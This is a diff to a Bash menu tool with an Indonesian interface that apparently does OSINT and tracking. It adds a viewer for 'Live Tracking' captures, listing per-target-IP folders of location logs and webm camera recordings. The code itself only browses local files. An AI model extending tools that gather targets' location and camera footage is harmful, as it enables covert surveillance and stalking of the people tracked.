@@ -3289,13 +3289,13 @@ history_session() {
   local ans notice=""
   while :; do
     header
-    printf '  %sRIWAYAT HASIL%s  %s(pilih jenis riwayat atau menu tambahan)%s\n\n' "$B" "$R" "$D" "$R"
+    printf '  %sRIWAYAT HASIL%s  %s(pilih jenis riwayat atau data tangkapan)%s\n\n' "$B" "$R" "$D" "$R"
     [ -n "$HIST_NOTICE" ] && { printf '  %s%s%s\n\n' "${HIST_NOTICE_CLR:-$GRN}" "$HIST_NOTICE" "$R"; HIST_NOTICE=""; }
     [ -n "$notice" ] && { printf '  %s%s%s\n\n' "$RED" "$notice" "$R"; notice=""; }
     printf '  %s[1]%s Pencarian umum  %s(%s tersimpan)%s\n' "$B$CYN" "$R" "$D" "$(count_dirs "$BASE/hasil")" "$R"
     printf '  %s[2]%s Cek email  %s(%s tersimpan)%s\n' "$B$CYN" "$R" "$D" "$(count_dirs "$EMAIL_DIR")" "$R"
     printf '  %s[3]%s Cek IP  %s(%s tersimpan)%s\n' "$B$CYN" "$R" "$D" "$(count_dirs "$IP_DIR")" "$R"
-    printf '  %s[4]%s Live Tracking / Template Preview\n' "$B$CYN" "$R"
+    printf '  %s[4]%s Data Live Tracking (Lokasi & Kamera)\n' "$B$CYN" "$R"
     printf '  %s[Bersihkan]%s\n' "$B$CYN" "$R"
     printf '\n  Pilih nomor (kosongkan untuk kembali): '
     read -r ans || exit 0
@@ -3305,10 +3305,56 @@ history_session() {
       1) history_browse "$BASE/hasil" "RIWAYAT · PENCARIAN UMUM" '.query' umum ;;
       2) history_browse "$EMAIL_DIR" "RIWAYAT · CEK EMAIL" '"\(.email)  · skor \(.score)/100"' email ;;
       3) history_browse "$IP_DIR" "RIWAYAT · CEK IP" '"\(.input)  · \(.ips | length) IP"' ip ;;
-      4) share_project_session ;;
+      4) browse_live_tracking_data ;;
       bersihkan) clean_menu || true ;;
       *) notice="Pilihan tidak valid. Ketik 1, 2, 3, 4, atau Bersihkan, atau kosongkan lalu Enter untuk kembali." ;;
     esac
+  done
+}
+
+# Fungsi tambahan untuk membuka dan melihat daftar folder/data tangkapan Live Tracking
+browse_live_tracking_data() {
+  local vid_dir="$BASE/saved_videos"
+  if [ ! -d "$vid_dir" ] || [ -z "$(ls -A "$vid_dir" 2>/dev/null)" ]; then
+    header
+    printf '  %sDATA LIVE TRACKING%s\n\n  Belum ada data lokasi atau rekaman kamera yang tersimpan.\n\n' "$B" "$R"
+    pause
+    return
+  fi
+
+  local dirs=() d i ans notice=""
+  while :; do
+    header
+    printf '  %sDATA TANGKAPAN LIVE TRACKING (LOKASI & KAMERA)%s\n\n' "$B" "$R"
+    [ -n "$notice" ] && { printf '  %s%s%s\n\n' "$RED" "$notice" "$R"; notice=""; }
+    mapfile -t dirs < <(find "$vid_dir" -mindepth 1 -maxdepth 1 -type d 2>/dev/null | sort)
+    if [ "${#dirs[@]}" -eq 0 ]; then
+      printf '  Semua data kosong.\n\n'; pause; return
+    fi
+    i=1
+    for d in "${dirs[@]}"; do
+      local ip_name=$(basename "$d")
+      local loc_count=$(find "$d" -name "log_lokasi.txt" | wc -l)
+      local vid_count=$(find "$d" -name "*.webm" | wc -l)
+      printf '  %s[%d]%s Target IP: %s  %s(Log Lokasi: %d, Video Webm: %d)%s\n' \
+        "$B$CYN" "$i" "$R" "$ip_name" "$D" "$loc_count" "$vid_count" "$R"
+      i=$((i + 1))
+    done
+    printf '\n  Pilih nomor target untuk melihat isi foldernya (kosongkan untuk kembali): '
+    read -r ans || exit 0
+    [ -z "$ans" ] && return
+    if [[ $ans =~ ^[0-9]+$ ]] && (( ans >= 1 && ans <= ${#dirs[@]} )); then
+      local selected_dir="${dirs[ans-1]}"
+      header
+      printf '  %sISI FOLDER TARGET: %s%s\n\n' "$B" "$(basename "$selected_dir")" "$R"
+      printf '  Path folder di komputer:\n  %s\n\n' "$selected_dir"
+      printf '  Daftar file tangkapan:\n'
+      ls -la "$selected_dir"
+      printf '\n'
+      pause
+    else
+      notice="Nomor tidak valid."
+    fi
   done
 }
 
